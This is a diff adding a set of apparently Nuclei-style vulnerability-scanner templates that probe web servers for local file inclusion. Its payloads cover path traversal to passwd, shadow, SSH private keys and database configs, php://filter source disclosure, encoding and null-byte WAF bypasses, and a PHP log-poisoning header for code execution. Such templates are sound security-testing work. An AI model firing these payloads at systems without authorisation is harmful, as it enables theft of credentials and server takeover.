@@ -1,0 +1,233 @@
+id: basic-lfi-unix
+info:
+  name: Local File Inclusion (Unix)
+  author: AniipID
+  severity: high
+  description: Detects LFI via common Unix file paths
+  tags: lfi,file-read
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?file=/etc/passwd"
+      - "{{BaseURL}}?file=../../../etc/passwd"
+      - "{{BaseURL}}?page=/etc/passwd"
+      - "{{BaseURL}}?page=../../../etc/passwd"
+      - "{{BaseURL}}?include=../../../etc/passwd"
+      - "{{BaseURL}}?inc=../../../etc/passwd"
+      - "{{BaseURL}}?load=../../../etc/passwd"
+      - "{{BaseURL}}?read=../../../etc/passwd"
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+          - "daemon:.*:1:1:"
+          - "bin:.*:2:2:"
+        condition: or
+        name: "unix-passwd-leaked"
+---
+id: basic-lfi-windows
+info:
+  name: Local File Inclusion (Windows)
+  author: AniipID
+  severity: high
+  description: Detects LFI via common Windows file paths
+  tags: lfi,file-read,windows
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?file=C:/Windows/win.ini"
+      - "{{BaseURL}}?file=C:\\Windows\\win.ini"
+      - "{{BaseURL}}?page=../../../Windows/win.ini"
+      - "{{BaseURL}}?file=C:/boot.ini"
+    matchers:
+      - type: word
+        words:
+          - "for 16-bit app support"
+          - "[fonts]"
+          - "[extensions]"
+          - "[files]"
+        condition: or
+        name: "windows-ini-leaked"
+---
+id: lfi-source-code
+info:
+  name: LFI Source Code Disclosure
+  author: AniipID
+  severity: high
+  description: Detects LFI that exposes PHP source code via php://filter
+  tags: lfi,source-code,php
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?file=php://filter/convert.base64-encode/resource=index.php"
+      - "{{BaseURL}}?file=php://filter/convert.base64-encode/resource=config.php"
+      - "{{BaseURL}}?page=php://filter/convert.base64-encode/resource=index"
+      - "{{BaseURL}}?inc=php://filter/read=convert.base64-encode/resource=index"
+    matchers:
+      - type: regex
+        regex:
+          - "^[A-Za-z0-9+/=]{50,}$"
+          - "PD9waHA"
+          - "PDw="
+        condition: or
+        name: "base64-source-code"
+---
+id: lfi-proc-environ
+info:
+  name: LFI via /proc/self/environ
+  author: AniipID
+  severity: high
+  description: Detects LFI via /proc/self/environ for env variable disclosure
+  tags: lfi,proc,env
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?file=../../../proc/self/environ"
+      - "{{BaseURL}}?file=../../../../proc/self/environ"
+      - "{{BaseURL}}?page=../../../proc/self/environ"
+    matchers:
+      - type: word
+        words:
+          - "HTTP_HOST"
+          - "DOCUMENT_ROOT"
+          - "SERVER_ADMIN"
+        condition: or
+        name: "proc-environ-leaked"
+---
+id: lfi-log-poisoning
+info:
+  name: LFI via Log Poisoning
+  author: AniipID
+  severity: critical
+  description: Detects LFI that can access log files for RCE via poisoning
+  tags: lfi,rce,log-poisoning
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?file=../../../var/log/apache2/access.log"
+      - "{{BaseURL}}?file=../../../var/log/apache2/error.log"
+      - "{{BaseURL}}?file=../../../var/log/httpd/access_log"
+      - "{{BaseURL}}?file=../../../var/log/nginx/access.log"
+    headers:
+      User-Agent: "<?php system('id');?>"
+    matchers:
+      - type: regex
+        regex:
+          - "uid=\\d+"
+          - "www-data"
+          - "apache"
+        condition: or
+        name: "log-poisoning-rce"
+---
+id: lfi-ssh-keys
+info:
+  name: LFI SSH Key Disclosure
+  author: AniipID
+  severity: critical
+  description: Detects LFI capable of reading SSH private keys
+  tags: lfi,ssh,keys
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?file=../../../root/.ssh/id_rsa"
+      - "{{BaseURL}}?file=../../../home/ubuntu/.ssh/id_rsa"
+      - "{{BaseURL}}?file=../../../root/.ssh/authorized_keys"
+    matchers:
+      - type: word
+        words:
+          - "BEGIN RSA PRIVATE KEY"
+          - "BEGIN OPENSSH PRIVATE KEY"
+          - "ssh-rsa"
+          - "ssh-ed25519"
+        condition: or
+        name: "ssh-key-leaked"
+---
+id: lfi-db-config
+info:
+  name: LFI Database Configuration Disclosure
+  author: AniipID
+  severity: critical
+  description: Detects LFI exposing database configuration files
+  tags: lfi,config,database
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?file=../../../var/www/html/config.php"
+      - "{{BaseURL}}?file=../../../var/www/html/wp-config.php"
+      - "{{BaseURL}}?file=../../../var/www/html/.env"
+      - "{{BaseURL}}?file=../../../app/config/database.php"
+    matchers:
+      - type: regex
+        regex:
+          - "DB_HOST|DB_NAME|DB_USER|DB_PASSWORD"
+          - "'host'\\s*=>"
+          - "define\\('DB_"
+        condition: or
+        name: "db-config-leaked"
+---
+id: lfi-with-null-byte
+info:
+  name: LFI Null Byte Injection
+  author: AniipID
+  severity: high
+  description: Detects LFI using null byte truncation (older PHP)
+  tags: lfi,null-byte
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?file=../../../etc/passwd%00"
+      - "{{BaseURL}}?file=../../../etc/passwd%00.php"
+      - "{{BaseURL}}?page=../../../etc/passwd%00.html"
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+        name: "null-byte-lfi"
+---
+id: lfi-path-traversal-encoded
+info:
+  name: LFI Encoded Path Traversal
+  author: AniipID
+  severity: high
+  description: Detects LFI using URL-encoded path traversal sequences
+  tags: lfi,encoded,waf-bypass
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd"
+      - "{{BaseURL}}?file=..%252f..%252f..%252fetc/passwd"
+      - "{{BaseURL}}?file=....//....//....//etc/passwd"
+      - "{{BaseURL}}?file=..\\/..\\/..\\/etc/passwd"
+    matchers:
+      - type: regex
+        regex:
+          - "root:.*:0:0:"
+        name: "encoded-lfi"
+---
+id: lfi-config-files
+info:
+  name: LFI Sensitive Config Files
+  author: AniipID
+  severity: high
+  description: Detects LFI exposing various application configuration files
+  tags: lfi,config,sensitive
+requests:
+  - method: GET
+    path:
+      - "{{BaseURL}}?file=../../../etc/issue"
+      - "{{BaseURL}}?file=../../../etc/shadow"
+      - "{{BaseURL}}?file=../../../etc/group"
+      - "{{BaseURL}}?file=../../../etc/hosts"
+      - "{{BaseURL}}?file=../../../etc/crontab"
+      - "{{BaseURL}}?file=../../../etc/nginx/nginx.conf"
+      - "{{BaseURL}}?file=../../../etc/apache2/apache2.conf"
+      - "{{BaseURL}}?file=../../../etc/ssh/sshd_config"
+    matchers:
+      - type: regex
+        regex:
+          - "root:\\$[0-9a-z]"
+          - "Ubuntu|Debian|CentOS"
+          - "127\\.0\\.0\\.1\\s+localhost"
+          - "server\\s*\\{"
+        condition: or
+        name: "config-file-leaked"
